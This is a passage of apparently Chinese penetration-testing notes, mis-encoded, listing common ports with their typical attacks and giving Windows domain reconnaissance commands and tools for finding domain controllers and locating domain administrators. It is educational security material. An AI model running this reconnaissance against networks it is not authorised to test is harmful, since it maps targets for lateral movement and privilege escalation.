<h3 id="2-6-6-ç«¯å£çš„bannerä¿¡æ¯"><a href="#2-6-6-ç«¯å£çš„bannerä¿¡æ¯" class="headerlink" title="2.6.6 ç«¯å£çš„bannerä¿¡æ¯"></a>2.6.6 ç«¯å£çš„bannerä¿¡æ¯</h3><p>â€‹        å¦‚æœé€šè¿‡æ‰«æå‘ç°äº†ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥å·¥å…·æˆ–è€…nc,è·å–æœåŠ¡ç«¯çš„Bannerä¿¡æ¯ã€‚è·å–Bannerä¿¡æ¯åï¼Œå¯ä»¥åœ¨æ¼æ´åº“ä¸­æŸ¥æ‰¾å¯¹åº”CVEç¼–å·çš„POCã€EXP,åœ¨ExploitDBã€Seebugç­‰å¹³å°ä¸ŠæŸ¥çœ‹ç›¸å…³çš„æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œç„¶ååˆ°ç›®æ ‡ç³»ç»Ÿä¸­éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œä»è€Œæœ‰é’ˆå¯¹æ€§åœ°è¿›è¡Œå®‰å…¨åŠ å›ºã€‚ç›¸å…³æ¼æ´çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ä¸¤ä¸ªç½‘ç«™ã€‚</p>
<ul>
<li><p>å®‰å…¨ç„¦ç‚¹ï¼šå…¶ä¸­çš„ BugTraq æ˜¯ä¸€ä¸ªå‡ºè‰²çš„æ¼æ´å’ŒExploitæ•°æ®æºï¼Œå¯ä»¥é€šè¿‡ CVE ç¼–å·æˆ–è€…äº§å“ä¿¡æ¯æ¼æ´ç›´æ¥æœç´¢ã€‚</p>
</li>
<li><p>Exploit-DBï¼šå–ä»£äº†è€ç‰Œå®‰å…¨ç½‘ç«™milw0rmï¼Œæä¾›äº†å¤§é‡çš„ Exploit ç¨‹åºå’Œç›¸å…³æŠ¥å‘Šã€‚</p>
</li>
<li><p>ç½‘å®‰-Vuln-DBï¼šç½‘å®‰æ¼æ´å¹³å°æ±‡é›†äº† CNNVD-å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ CNVD-å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å° CICSVD-å›½å®¶å·¥ä¸šä¿¡æ¯å®‰å…¨æ¼æ´åº“ç­‰ä¿¡æ¯ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://vul.wangan.com/">https://vul.wangan.com/</a></p>
</li>
</ul>
<p><strong>æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">21ã€22ã€69</td>
<td>FTP/TFTPæ–‡ä»¶ä¼ è¾“åè®®</td>
<td>å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´ã€å—…æ¢æ“ä½œ</td>
</tr>
<tr>
<td align="left">2049</td>
<td>NFSæœåŠ¡</td>
<td>é…ç½®ä¸å½“</td>
</tr>
<tr>
<td align="left">139</td>
<td>SAMBAæœåŠ¡</td>
<td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ</td>
</tr>
<tr>
<td align="left">389</td>
<td>LDAPç›®å½•è®¿é—®åè®®</td>
<td>æ³¨å…¥ã€å…è®¸åŒ¿åçš„è®¿é—®ã€å¼±å£ä»¤</td>
</tr>
</tbody></table>
<p><strong>è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">22</td>
<td>SSHè¿œç¨‹è¿æ¥</td>
<td>çˆ†ç ´ã€sshéš§é“ä»¥åŠå†…ç½‘ä»£ç†è½¬å‘ã€æ–‡ä»¶ä¼ è¾“</td>
</tr>
<tr>
<td align="left">23</td>
<td>Telnetè¿œç¨‹è¿æ¥</td>
<td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">3389</td>
<td>RDPè¿œç¨‹æ¡Œé¢è¿æ¥</td>
<td>Shiftåé—¨ï¼ˆWindows Server 2003ä»¥ä¸‹ç‰ˆæœ¬ï¼‰ã€çˆ†ç ´</td>
</tr>
<tr>
<td align="left">5900</td>
<td>VNC</td>
<td>å¼±å£ä»¤çˆ†ç ´</td>
</tr>
<tr>
<td align="left">5632</td>
<td>PcAnywhere æœåŠ¡</td>
<td>æŠ“å–å¯†ç ã€ä»£ç æ‰§è¡Œ</td>
</tr>
</tbody></table>
<p><strong>Webåº”ç”¨æœåŠ¡ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">80ã€443ã€8080</td>
<td>å¸¸è§WebæœåŠ¡ç«¯å£</td>
<td>Webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´</td>
</tr>
<tr>
<td align="left">7001ã€7002</td>
<td>Weblogicæ§åˆ¶å°</td>
<td>Java ååºåˆ—åŒ–ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">8080ã€8089</td>
<td>JBoss/Resin/Jetty/Jenkins</td>
<td>ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">9090</td>
<td>WebSphereæ§åˆ¶å°</td>
<td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">4848</td>
<td>GlassFishæ§åˆ¶å°</td>
<td>å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">1352</td>
<td>Lotus Dominoé‚®ä»¶æœåŠ¡</td>
<td>å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´</td>
</tr>
<tr>
<td align="left">10000</td>
<td>Webminæ§åˆ¶é¢æ¿</td>
<td>å¼±å£ä»¤</td>
</tr>
</tbody></table>
<p><strong>æ•°æ®åº“æœåŠ¡ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">3306</td>
<td>MySQLæ•°æ®åº“</td>
<td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td>
</tr>
<tr>
<td align="left">1433</td>
<td>MSSQLæ•°æ®åº“</td>
<td>æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤ã€çˆ†ç ´</td>
</tr>
<tr>
<td align="left">1521</td>
<td>Oracleæ•°æ®åº“</td>
<td>TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹shell</td>
</tr>
<tr>
<td align="left">5432</td>
<td>PostgreSQLæ•°æ®åº“</td>
<td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td align="left">27017ã€27018</td>
<td>MongoDBæ•°æ®åº“</td>
<td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td align="left">6379</td>
<td>Redisæ•°æ®åº“</td>
<td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€åå¼¹shell</td>
</tr>
<tr>
<td align="left">5000</td>
<td>Sysbase/DB2æ•°æ®åº“</td>
<td>çˆ†ç ´ã€æ³¨å…¥</td>
</tr>
</tbody></table>
<p><strong>é‚®ä»¶æœåŠ¡ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">25</td>
<td>SMTPé‚®ä»¶æœåŠ¡</td>
<td>é‚®ä»¶ä¼ªé€ </td>
</tr>
<tr>
<td align="left">110</td>
<td>POP3åè®®</td>
<td>çˆ†ç ´ã€å—…æ¢</td>
</tr>
<tr>
<td align="left">143</td>
<td>IMAPåè®®</td>
<td>çˆ†ç ´ã€å—…æ¢</td>
</tr>
</tbody></table>
<p><strong>ç½‘ç»œå¸¸è§åè®®ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">53</td>
<td>DNSåŸŸåæœåŠ¡</td>
<td>å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td>
</tr>
<tr>
<td align="left">67ã€68</td>
<td>DHCPæœåŠ¡</td>
<td>åŠ«æŒã€æ¬ºéª—</td>
</tr>
<tr>
<td align="left">161</td>
<td>SNMPåè®®</td>
<td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td>
</tr>
</tbody></table>
<p><strong>ç‰¹æ®ŠæœåŠ¡ç«¯å£</strong></p>
<table>
<thead>
<tr>
<th align="left">ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2181</td>
<td>ZooKeeper.æœåŠ¡</td>
<td>æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td align="left">8069</td>
<td>ZabbixæœåŠ¡</td>
<td>è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥</td>
</tr>
<tr>
<td align="left">9200ã€9300</td>
<td>ElasticsearchæœåŠ¡</td>
<td>è¿œç¨‹æ‰§è¡Œ</td>
</tr>
<tr>
<td align="left">11211</td>
<td>MemcachedæœåŠ¡</td>
<td>æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td align="left">512ã€513ã€514</td>
<td>Linux rexecæœåŠ¡</td>
<td>çˆ†ç ´ã€è¿œç¨‹ç™»å½•</td>
</tr>
<tr>
<td align="left">873</td>
<td>rsyncæœåŠ¡</td>
<td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td>
</tr>
<tr>
<td align="left">3690</td>
<td>SVNæœåŠ¡</td>
<td>SVNæ³„éœ²ã€æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td align="left">50000</td>
<td>SAP Management Console</td>
<td>è¿œç¨‹æ‰§è¡Œ</td>
</tr>
</tbody></table>
<h2 id="2-7-æœé›†åŸŸå†…åŸºç¡€ä¿¡æ¯"><a href="#2-7-æœé›†åŸŸå†…åŸºç¡€ä¿¡æ¯" class="headerlink" title="2.7 æœé›†åŸŸå†…åŸºç¡€ä¿¡æ¯"></a>2.7 æœé›†åŸŸå†…åŸºç¡€ä¿¡æ¯</h2><p>â€‹        ç¡®å®šäº†å½“å‰å†…ç½‘æ‹¥æœ‰çš„åŸŸï¼Œä¸”æ‰€æ§åˆ¶çš„ä¸»æœºåœ¨åŸŸå†…ï¼Œå°±å¯ä»¥è¿›è¡ŒåŸŸå†…ç›¸å…³ä¿¡æ¯çš„æ”¶é›†äº†ã€‚å› ä¸ºæœ¬èŠ‚å°†è¦ä»‹ç»çš„æŸ¥è¯¢å‘½ä»¤åœ¨æœ¬è´¨ä¸Šéƒ½æ˜¯é€šè¿‡<code>LDAP</code> åè®®åˆ°åŸŸæ§åˆ¶å™¨ä¸Šè¿›è¡ŒæŸ¥è¯¢çš„ï¼Œæ‰€ä»¥åœ¨æŸ¥è¯¢æ—¶éœ€è¦è¿›è¡Œæƒé™è®¤è¯ã€‚åªæœ‰åŸŸç”¨æˆ·æ‰æ‹¥æœ‰æ­¤æƒé™ï¼Œæœ¬åœ°ç”¨æˆ·æ— æ³•è¿è¡Œæœ¬èŠ‚ä»‹ç»çš„æŸ¥è¯¢å‘½ä»¤(Systemæƒé™ç”¨æˆ·é™¤å¤–ã€‚åœ¨åŸŸä¸­ï¼Œé™¤æ™®é€šç”¨æˆ·å¤–ï¼Œæ‰€æœ‰çš„æœºå™¨éƒ½æœ‰ä¸€ä¸ªæœºå™¨ç”¨æˆ·ï¼Œå…¶ç”¨æˆ·åä¸ºæœºå™¨ååŠ ä¸Š<code>$</code>ã€‚Systemæƒé™ç”¨æˆ·å¯¹åº”çš„å°±æ˜¯åŸŸé‡Œé¢çš„æœºå™¨ç”¨æˆ·ï¼Œæ‰€ä»¥<code>System</code>æƒé™ç”¨æˆ·å¯ä»¥è¿è¡Œã€‚</p>
<p>â€‹        åœ¨åŸŸç¯å¢ƒä¸­ï¼ŒåŸŸç”¨æˆ·é»˜è®¤æ˜¯å¯ä»¥ç™»å½•åŸŸå†…ä»»ä½•ä¸€å°æœºå™¨çš„ï¼Œè¿™æ˜¯å› ä¸ºåŸŸç®¡ç†å‘˜åœ¨æ–°å¢åŸŸç”¨æˆ·æ—¶è¯¥åŸŸç”¨æˆ·é»˜è®¤å°±ä¼šå­˜åœ¨åŸŸç”¨æˆ·ç»„ Domain Users ä¸­ï¼ŒåŠ å…¥åŸŸçš„åŸŸæˆå‘˜æœºå™¨ä¼šé»˜è®¤å°†å…¨å±€ç»„ Domain Users åŠ åˆ°å…¶æœ¬åœ°çš„ User ç»„ä¸­ï¼Œè€ŒåŸŸæˆå‘˜æœºå™¨æœ¬åœ°ç»„ç­–ç•¥ä¸­çš„ â€œå…è®¸åœ¨æœ¬åœ°ç™»é™†â€ å±æ€§ä¸­åŒ…å«äº†æœ¬åœ°çš„ Users ç»„ã€‚    </p>
<p><strong>A. æŸ¥è¯¢åŸŸ</strong></p>
<pre><code class="hljs powershell">net view /domain</code></pre>

<p><strong>B. æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº</strong></p>
<p>å¯é€šè¿‡æŸ¥è¯¢åˆ°çš„ä¸»æœºåå¯¹ä¸»æœºè§’è‰²è¿›è¡Œåˆæ­¥åˆ¤æ–­ï¼Œdevã€web\appã€NASå¯èƒ½åˆ†åˆ«å¯¹åº”å¼€å‘æœåŠ¡å™¨ã€WebæœåŠ¡å™¨ã€å­˜å‚¨æœåŠ¡å™¨ã€‚</p>
<pre><code class="hljs powershell">net view /domain:<span class="hljs-built_in">TEST-2012</span></code></pre>

<p>å¦‚æœæŠ¥é”™ <code>å‘ç”Ÿç³»ç»Ÿé”™è¯¯  6118</code>ï¼Œé¦–å…ˆéœ€è¦æ£€æŸ¥é˜²ç«å¢™ï¼Œå…¶æ¬¡æ£€æŸ¥<code>Server </code>ï¼Œ<code>WorkStation</code>ï¼Œ<code>computer Browser</code>ä¸‰é¡¹æœåŠ¡æ˜¯å¦å¯åŠ¨ï¼Œä¸€èˆ¬éƒ½æ˜¯<code>computer Browser</code>éœ€è¦æ‰‹åŠ¨å¯åŠ¨å¯¼è‡´çš„ï¼Œæœ€åæ£€æŸ¥è®¡ç®—æœºæ˜¯å¦å®‰è£…<code>SMB1.0/CIFS æ–‡ä»¶å…±äº«æ”¯æŒ</code>åŠŸèƒ½ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414103633042.png" alt="image-20220414103633042" style="zoom:50%;" />

<p><strong>C. æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨</strong></p>
<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> /domain</code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414181625791.png" alt="image-20220414181625791" style="zoom:50%;" />

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥åŸŸå†…æœ‰13ä¸ªç»„ã€‚ç³»ç»Ÿè‡ªå¸¦çš„å¸¸è§ç”¨æˆ·èº«ä»½å¦‚ä¸‹ã€‚</p>
<ul>
<li>Domain Admins:åŸŸç®¡ç†å‘˜ã€‚</li>
<li>Domain Computers:åŸŸå†…æœºå™¨ã€‚</li>
<li>Domain Controllers:åŸŸæ§åˆ¶å™¨ã€‚</li>
<li>Domain Guest::åŸŸè®¿å®¢ï¼Œæƒé™è¾ƒä½ã€‚</li>
<li>Domain Users:åŸŸç”¨æˆ·ã€‚</li>
<li>Enterprise Admins:ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ã€‚</li>
</ul>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒDomain Adminså’ŒEnterprise Adminså¯¹åŸŸå†…æ‰€æœ‰åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚</p>
<p><strong>D. æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨</strong></p>
<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain</code></pre>

<p><strong>E. è·å–åŸŸå¯†ç ç­–ç•¥ä¿¡æ¯</strong></p>
<pre><code class="hljs powershell">net accounts /domain</code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414193704134.png" alt="image-20220414193704134" style="zoom:50%;" />

<p><strong>F. è·å–åŸŸä¿¡ä»»ä¿¡æ¯</strong></p>
<pre><code class="hljs powershell">nltest /domain_trusts</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414193823734.png" alt="image-20220414193823734"></p>
<h2 id="2-8-æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨"><a href="#2-8-æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨" class="headerlink" title="2.8 æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨"></a>2.8 æŸ¥æ‰¾åŸŸæ§åˆ¶å™¨</h2><pre><code class="hljs powershell"><span class="hljs-comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„æœºå™¨å</span>
nltest /DCLIST:<span class="hljs-built_in">TEST-2012</span>
<span class="hljs-comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå</span>
Nslookup <span class="hljs-literal">-type</span>=SRV _ldap._tcp
<span class="hljs-comment"># æŸ¥çœ‹å½“å‰æ—¶é—´ï¼ˆé€šå¸¸æ—¶é—´æœåŠ¡å™¨ä¸ºä¸»åŸŸæ§åˆ¶å™¨ï¼‰</span>
net time /domain
<span class="hljs-comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„</span>
net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain
<span class="hljs-comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„æœºå™¨åä¸ºâ€DCâ€œ</span>
netdom query pdc</code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414222331712.png" alt="image-20220414222331712" style="zoom: 50%;" />

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220414222440944.png" alt="image-20220414222440944"></p>
<h2 id="2-9-è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯"><a href="#2-9-è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯" class="headerlink" title="2.9 è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯"></a>2.9 è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯</h2><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·</span>
net group &quot;domain admins&quot; /domain
<span class="hljs-meta">#</span><span class="bash"> æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„</span>
net group &quot;Enterprise Admins&quot; /domain</code></pre>

<h2 id="2-10-å®šä½åŸŸç®¡ç†å‘˜"><a href="#2-10-å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="2.10 å®šä½åŸŸç®¡ç†å‘˜"></a>2.10 å®šä½åŸŸç®¡ç†å‘˜</h2><h3 id="2-10-1-åŸŸç®¡ç†å‘˜å®šä½æ¦‚è¿°"><a href="#2-10-1-åŸŸç®¡ç†å‘˜å®šä½æ¦‚è¿°" class="headerlink" title="2.10.1 åŸŸç®¡ç†å‘˜å®šä½æ¦‚è¿°"></a>2.10.1 åŸŸç®¡ç†å‘˜å®šä½æ¦‚è¿°</h3><p>â€‹        åœ¨å†…ç½‘ä¸­ï¼Œé€šå¸¸ä¼šéƒ¨ç½²å¤§é‡çš„ç½‘ç»œå®‰å…¨ç³»ç»Ÿå’Œè®¾å¤‡ï¼Œä¾‹å¦‚IDSã€IPSã€æ—¥å¿—å®¡è®¡ã€å®‰å…¨ç½‘å…³ã€åç—…æ¯’è½¯ä»¶ç­‰ã€‚åœ¨åŸŸç½‘ç»œæ”»å‡»æµ‹è¯•ä¸­ï¼Œè·å–åŸŸå†…çš„ä¸€ä¸ªæ”¯ç‚¹åï¼Œéœ€è¦è·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚</p>
<p>â€‹        åœ¨ä¸€ä¸ªåŸŸä¸­ï¼Œå½“è®¡ç®—æœºåŠ å…¥åŸŸåï¼Œä¼šé»˜è®¤ç»™åŸŸç®¡ç†å‘˜ç»„èµ‹äºˆæœ¬åœ°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è®¡ç®—æœºè¢«æ·»åŠ åˆ°åŸŸä¸­ï¼Œæˆä¸ºåŸŸçš„æˆå‘˜ä¸»æœºåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†åŸŸç®¡ç†å‘˜ç»„æ·»åŠ åˆ°æœ¬åœ°ç³»ç»Ÿç®¡ç†å‘˜ç»„ä¸­ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜ç»„çš„æˆå‘˜å‡å¯è®¿é—®æœ¬åœ°è®¡ç®—æœºï¼Œä¸”å…·å¤‡å®Œå…¨æ§åˆ¶æƒé™ã€‚</p>
<p>â€‹        å®šä½åŸŸå†…ç®¡ç†å‘˜çš„å¸¸è§„æ¸ é“ï¼Œä¸€æ˜¯æ—¥å¿—ï¼ŒäºŒæ˜¯ä¼šè¯ã€‚æ—¥å¿—æ˜¯æŒ‡æœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬æˆ–<code>Wevtutil</code>å·¥å…·å¯¼å‡ºå¹¶æŸ¥çœ‹ã€‚ä¼šè¯æ˜¯æŒ‡åŸŸå†…æ¯å°æœºå™¨çš„ç™»å½•ä¼šè¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>netsess.exe</code> æˆ– <code>PowerView</code> ç­‰å·¥å…·æŸ¥è¯¢ï¼ˆå¯ä»¥åŒ¿åæŸ¥è¯¢ï¼Œä¸éœ€è¦æƒé™)ã€‚</p>
<h3 id="2-10-2-å¸¸ç”¨åŸŸç®¡ç†å‘˜å®šä½å·¥å…·"><a href="#2-10-2-å¸¸ç”¨åŸŸç®¡ç†å‘˜å®šä½å·¥å…·" class="headerlink" title="2.10.2 å¸¸ç”¨åŸŸç®¡ç†å‘˜å®šä½å·¥å…·"></a>2.10.2 å¸¸ç”¨åŸŸç®¡ç†å‘˜å®šä½å·¥å…·</h3><p>â€‹        å‡è®¾å·²ç»åœ¨<code>Windows</code> åŸŸä¸­å–å¾—äº†æ™®é€šç”¨æˆ·æƒé™ï¼Œå¸Œæœ›åœ¨åŸŸå†…æ¨ªå‘ç§»åŠ¨ï¼Œéœ€è¦çŸ¥é“åŸŸå†…ç”¨æˆ·ç™»å½•çš„ä½ç½®ã€ä»–æ˜¯å¦æ˜¯ä»»ä½•ç³»ç»Ÿçš„æœ¬åœ°ç®¡ç†å‘˜ã€ä»–æ‰€å±çš„ç»„ã€ä»–æ˜¯å¦æœ‰æƒè®¿é—®æ–‡ä»¶å…±äº«ç­‰ã€‚æšä¸¾ä¸»æœºã€ç”¨æˆ·å’Œç»„ï¼Œæœ‰åŠ©äºæ›´å¥½åœ°äº†è§£åŸŸçš„å¸ƒå±€ã€‚</p>
<p>â€‹        å¸¸ç”¨çš„åŸŸç®¡ç†å‘˜å®šä½å·¥å…·æœ‰ <code>psloggedon.exe</code>ã€<code>PVEFindADUser.exe</code>ã€<code>netsess.exe</code>ï¼Œä»¥åŠ <code>hunter</code> ã€<code>NetView</code> ç­‰ã€‚åœ¨ <code>PowerShell</code>ä¸­ï¼Œå¸¸ç”¨çš„å·¥å…·æ˜¯ <code>PowerView</code>ã€‚</p>
<p><strong>1.psloggedon.exe</strong></p>
<p>â€‹        åœ¨ Windows å¹³å°ä¸Šï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤<code>net session</code>æ¥æŸ¥çœ‹è°ä½¿ç”¨äº†æœ¬æœºèµ„æºï¼Œä½†æ˜¯æ²¡æœ‰å‘½ä»¤å¯ä»¥ç”¨æ¥æŸ¥çœ‹è°åœ¨ä½¿ç”¨è¿œç¨‹è®¡ç®—æœºèµ„æºã€è°ç™»å½•äº†æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœºã€‚ä½¿ç”¨<code>psloggedon.exe</code>ï¼Œå¯ä»¥æŸ¥çœ‹æœ¬åœ°ç™»å½•çš„ç”¨æˆ·å’Œé€šè¿‡æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºçš„èµ„æºç™»å½•çš„ç”¨æˆ·ã€‚å¦‚æœæŒ‡å®šçš„æ˜¯ç”¨æˆ·åè€Œä¸æ˜¯è®¡ç®—æœºåï¼Œ<code>psloggedon.exe</code> ä¼šæœç´¢ç½‘ä¸Šé‚»å±…ä¸­çš„è®¡ç®—æœºï¼Œå¹¶æ˜¾ç¤ºè¯¥ç”¨æˆ·å½“å‰æ˜¯å¦å·²ç»ç™»å½•ã€‚å…¶åŸç†æ˜¯é€šè¿‡æ£€æŸ¥æ³¨å†Œè¡¨ <code>HKEY_USERS</code> é¡¹çš„ key å€¼æ¥æŸ¥è¯¢è°ç™»å½•è¿‡(éœ€è¦è°ƒç”¨<code>NetSessionEnum API</code>)ï¼Œä½†æŸäº›åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½ä½¿ç”¨ã€‚</p>
<p>â€‹        <code>psloggedon.exe</code> çš„ä¸‹è½½åœ°å€è§:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0%EF%BC%9A%60psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedonï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åŠå‚æ•°ï¼š`psloggedon</a> [-] [-l] [-x] [\computername|username]`</p>
<ul>
<li><p>[-]: æ˜¾ç¤ºæ”¯æŒçš„é€‰é¡¹å’Œç”¨äºè¾“å‡ºå€¼çš„å•ä½ã€‚</p>
</li>
<li><p>[-l]: ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•ï¼Œä¸æ˜¾ç¤ºæœ¬åœ°å’Œç½‘ç»œèµ„æºç™»å½•ã€‚</p>
</li>
<li><p>[-x]: ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´ã€‚</p>
</li>
<li><p>[\computername]: æŒ‡å®šè¦åˆ—å‡ºç™»å½•ä¿¡æ¯çš„è®¡ç®—æœºçš„åç§°ã€‚</p>
</li>
<li><p>[username]: æŒ‡å®šç”¨æˆ·åï¼Œåœ¨ç½‘ç»œä¸­æœç´¢è¯¥ç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºã€‚</p>
</li>
</ul>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220505064148110.png" alt="image-20220505064148110" style="zoom:67%;" />



<p><strong>2. PVEFindADUser.exe</strong></p>
<p>â€‹        <code>PVEFindADUser.exe</code> å¯ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•çš„ä½ç½®ã€æšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ã€é€šè¿‡ RDP ç™»å½•çš„ç”¨æˆ·ã€ç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚è¿è¡Œè¯¥å·¥å…·çš„è®¡ç®—æœºéœ€è¦é…ç½® <strong>NET Framework2.0</strong> ç¯å¢ƒï¼Œå¹¶ä¸”éœ€è¦å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚</p>
